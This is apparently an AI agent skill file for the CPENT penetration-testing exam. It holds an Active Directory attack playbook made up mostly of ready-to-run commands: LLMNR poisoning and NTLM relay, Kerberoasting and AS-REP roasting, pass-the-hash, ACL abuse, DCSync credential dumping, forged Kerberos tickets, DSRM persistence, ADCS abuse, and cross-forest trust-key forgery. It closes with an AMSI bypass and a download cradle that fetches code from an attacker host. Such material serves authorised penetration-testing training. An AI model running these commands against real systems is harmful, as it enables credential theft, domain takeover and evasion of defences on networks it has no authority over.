---
name: active-directory
description: Active Directory attack playbook for CPENT Zone 2 — enumeration, Kerberos roasting (incl. cross-forest), lateral movement, credential extraction, and domain dominance. Use once you have pivoted into the domain. Covers CPENT v2 cross-forest trust scenarios.
---

# Active Directory (Zone 2, 15%)

AD is **not reachable from outside** — pivot in first (`pivoting` skill). Then the chain is:
enumerate → harvest creds → lateral → privesc → domain admin. CPENT v2 adds **cross-forest**
scenarios, so enumerate trusts and try roasting across them.

Keep a running credential file — reuse is rampant (`bin/cpent cred add/list`).

## Enumerate

Impacket tools have two naming conventions on Kali — use `bin/cpent impacket <tool.py>` to
find the right binary. All commands below use evidence capture for auto-logging.

```
# Use evidence capture for all AD commands:
bin/cpent ev "bloodhound-python -u <u> -p <p> -d <domain> -c all -ns <dc-ip>" --ip <dc-ip> --zone active-directory --label bloodhound
bin/cpent ev "$(bin/cpent impacket GetADUsers.py) <domain>/<u>:<p> -dc-ip <dc-ip> -all" --ip <dc-ip> --zone active-directory
bin/cpent ev "crackmapexec smb <dc-ip> -u <u> -p <p> --users --groups --shares" --ip <dc-ip> --zone active-directory

# trusts (cross-forest): from a Windows foothold
bin/cpent ev "nltest /domain_trusts" --ip <dc-ip> --zone active-directory --remote winrm --user <u> --secret '<p>'
```

**BloodHound — what to look for** (don't just collect, analyse):
- Mark owned nodes, then **Shortest Paths to Domain Admins** from owned.
- Pre-built queries: Kerberoastable users, AS-REP-roastable users, unconstrained-delegation
  hosts, "Find computers where Domain Users can RDP/PSRemote".
- ACL edges you can abuse: `GenericAll`, `GenericWrite`, `WriteDacl`, `WriteOwner`,
  `AddMember`, `ForceChangePassword`, `AllowedToDelegate` (see ACL abuse below).

## LLMNR/NBT-NS/mDNS poisoning & NTLM relay (often your FIRST AD foothold)

When you have **no creds** on a segment, poison name resolution to capture auth, then crack
or relay it. This is a CPENT staple — try it early.

```
# 1. Capture NetNTLMv2 hashes by poisoning LLMNR/NBT-NS/mDNS:
bin/cpent ev "responder -I <iface> -wv" --ip <segment> --zone active-directory --label responder
#    hashes land in /usr/share/responder/logs/ → crack:  hashcat -m 5600 hash.txt rockyou.txt

# 2. Find relay targets (SMB signing NOT required/enabled):
bin/cpent ev "nxc smb <range> --gen-relay-list relaytargets.txt" --ip <range> --zone active-directory

# 3. RELAY instead of crack (turn off SMB+HTTP in Responder.conf first):
#    capture → relay to a target where the victim is local admin:
bin/cpent ev "impacket-ntlmrelayx -tf relaytargets.txt -smb2support -c 'whoami'" --ip <range> --zone active-directory
#    add  -i  for an interactive SMB client,  --delegate-access  for RBCD,
#    or relay to LDAP(S):  -t ldaps://<dc>  --escalate-user <you>  (ACL/RBCD escalation)
```

Coercion to *force* a privileged machine to authenticate (feed the relay): PetitPotam
(`petitpotam.py`), PrinterBug/SpoolSample (`printerbug.py`), or `coercer coerce`. Relaying a
**DC's** machine auth to LDAP → RBCD or shadow-credentials → DC takeover.

## Kerberos — easy early wins, always try

```
# Find the right impacket binary first:
GSPN=$(bin/cpent impacket GetUserSPNs.py)
GNPU=$(bin/cpent impacket GetNPUsers.py)

# Kerberoast (SPN accounts) — crack with hashcat -m 13100
bin/cpent ev "$GSPN <domain>/<u>:<p> -request -dc-ip <dc-ip>" --ip <dc-ip> --zone active-directory --label kerberoast
# across a forest trust: add -target-domain <trusted.forest>

# AS-REP roast (no-preauth users) — crack with hashcat -m 18200
bin/cpent ev "$GNPU <domain>/ -usersfile users.txt -no-pass -dc-ip <dc-ip>" --ip <dc-ip> --zone active-directory --label asrep

# Crack with best available wordlist:
hashcat -m 13100 hash.txt $(bin/cpent wordlist brute-full)      # rockyou for Kerberoast
hashcat -m 18200 hash.txt $(bin/cpent wordlist brute-full)      # rockyou for AS-REP
```

## Lateral movement

```
psexec.py -hashes :<ntlm> <domain>/<u>@<t>        # pass-the-hash
wmiexec.py <domain>/<u>:<p>@<t>
evil-winrm -i <t> -u <u> -H <hash>
crackmapexec smb <subnet>/24 -u <u> -H <hash> -x 'whoami'   # spray + exec
```

## ACL abuse (the BloodHound edges — frequently the path to DA)

Turn a dangerous right over a principal into control. `bloodyAD`, `impacket`, or PowerView:

```
# ForceChangePassword — reset a victim's password you have this right over:
bloodyAD -u <you> -p <pw> -d <dom> --host <dc> set password <victim> 'NewPass123!'
net rpc password "<victim>" "NewPass123!" -U "<dom>/<you>%<pw>" -S <dc>     # or via rpc

# GenericAll / GenericWrite on a USER → targeted Kerberoast (set a fake SPN, roast, unset):
targetedKerberoast.py -u <you> -p <pw> -d <dom>
#   or shadow credentials if PKINIT is available (certipy/pywhisker) → asktgt with the cert.

# GenericAll / GenericWrite on a COMPUTER → RBCD:
#   set msDS-AllowedToActOnBehalfOfOtherIdentity to a computer you control, then S4U:
bloodyAD -u <you> -p <pw> -d <dom> --host <dc> add rbcd <target$> <controlled$>
getST.py -spn cifs/<target> -impersonate Administrator '<dom>/<controlled$>:<pw>'

# AddMember — add yourself to a privileged group:
net rpc group addmem "Domain Admins" "<you>" -U "<dom>/<you>%<pw>" -S <dc>

# WriteDacl / WriteOwner → grant yourself DCSync on the domain, then dump:
dacledit.py -action write -rights DCSync -principal <you> -target-dn '<domain DN>' <dom>/<you>:<pw>
```

## Credential extraction

```
secretsdump.py <domain>/<admin>@<dc-ip>           # remote SAM/LSA/NTDS
secretsdump.py -just-dc <domain>/<u>@<dc-ip>      # DCSync (needs replication rights)
# on-host: mimikatz  sekurlsa::logonpasswords ; lsadump::dcsync /user:krbtgt
```

## Domain dominance (ticket attacks)

Match the ticket to the secret you have:

| Attack | You need | Gives you |
|---|---|---|
| **Over-Pass-the-Hash** | a user's NTLM **or** AES256 key | a real TGT as that user (`Rubeus asktgt /user:.. /aes256:.. /ptt`) |
| **Silver Ticket** | the *service account* NTLM/RC4 (or the DC machine key for DC services) | a forged TGS for one service — no DC contact |
| **Golden Ticket** | the **krbtgt** AES256/RC4 + domain SID | a forged TGT as anyone, domain-wide |
| **Diamond Ticket** | the **krbtgt** key | a TGT cloned from a real one — stealthier than Golden |

- Get the krbtgt/service/machine secrets via **DCSync** (`secretsdump -just-dc`, or
  mimikatz `lsadump::dcsync`) once you hold replication rights or DA.
- Prefer **AES256 over NTLM** for ticket requests (opsec / fewer alerts).
- Delegation abuse (unconstrained / constrained / RBCD) and GPO abuse are alternative paths
  to the same secrets.

## DSRM (DC local persistence)

The DC's local Administrator (DSRM) hash is a backdoor. Extract it (`lsadump::lsa /patch`
or DCSync-equivalent), then enable network logon with it:
`reg add HKLM\System\CurrentControlSet\Control\Lsa /v DsrmAdminLogonBehavior /t REG_DWORD /d 2`,
then pass-the-hash as `<DC>\Administrator`.

## ADCS (certificate abuse)

If AD CS is present, a vulnerable template often beats password cracking: request a cert as
a Domain Admin / Enterprise Admin (the classic ESC1-style misconfig), save the `.pfx`, then
authenticate with it (`Rubeus asktgt /certificate:.. /ptt` or certipy). Enumerate first
(`certipy find` / Certify).

## Cross-domain (child → parent, same forest)

The forest is the real trust boundary — child DA can usually reach forest root:
- Forge a Golden Ticket with the **child krbtgt** and add the **parent/Enterprise Admins
  SID** to `/sids:` (SID-history injection), then `asktgs` for a service on the parent DC.

## Cross-forest (CPENT v2 tests this)

Across a forest **trust**, you don't get the trusted forest's krbtgt — you get the
**trust key**:
1. Extract the **inter-realm trust key** from your DC (`lsadump::trust /patch` / DCSync).
2. Forge an **inter-realm TGT** with that trust key for the trusted forest.
3. `Rubeus asktgs /service:<svc>/<trusted-dc>.<TRUSTED.FOREST> /dc:<trusted-dc> /ptt` to get
   a usable service ticket in the other forest, then act on that service.
- Also try: Kerberoasting across the trust (`GetUserSPNs -target-domain`), foreign-group
  membership, and any admin whose creds you already hold that are valid in both forests
  (reuse — check the tracker).

## AD evasion (when the range has logging/AppLocker/AMSI)

See the `defense-evasion` skill too. On a constrained host, before running tooling:
- Check the jail: `$ExecutionContext.SessionState.LanguageMode` (want FullLanguage),
  `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`.
- Reduce logging with an InviShell-style registry wrapper; use an AMSI bypass before a
  download cradle (`iex (iwr -UseBasicParsing http://<you>/amsibypass.txt)`).
- Find lateral targets without scanning: `Find-PSRemotingLocalAdminAccess`.
- Use captured creds in a new logon context: `runas /user:<dom>\<user> /netonly cmd`.

Write a finding for each foothold, each DA/EA, each cracked or DCSync'd secret, and every
cross-trust hop (the attack narrative in the report is graded on exactly this chain).
